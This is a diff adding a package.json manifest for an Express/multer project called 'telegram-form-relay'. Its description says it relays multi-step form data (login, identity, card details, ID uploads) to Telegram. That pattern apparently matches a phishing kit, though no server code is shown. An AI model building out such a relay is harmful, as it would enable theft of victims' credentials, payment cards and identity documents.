@@ -1,0 +1,29 @@
+{
+  "name": "telegram-form-relay",
+  "version": "1.0.0",
+  "description": "Multi-step form + file upload relay to Telegram (login, identity, card, ID upload).",
+  "main": "serve.js",
+  "type": "commonjs",
+  "engines": {
+    "node": ">=18.0.0"
+  },
+  "scripts": {
+    "start": "node serve.js",
+    "dev": "node --watch serve.js"
+  },
+  "keywords": [
+    "express",
+    "telegram",
+    "bot",
+    "multer",
+    "upload",
+    "forms"
+  ],
+  "author": "",
+  "license": "MIT",
+  "private": true,
+  "dependencies": {
+    "express": "^4.19.2",
+    "multer": "^1.4.5-lts.1"
+  }
+}
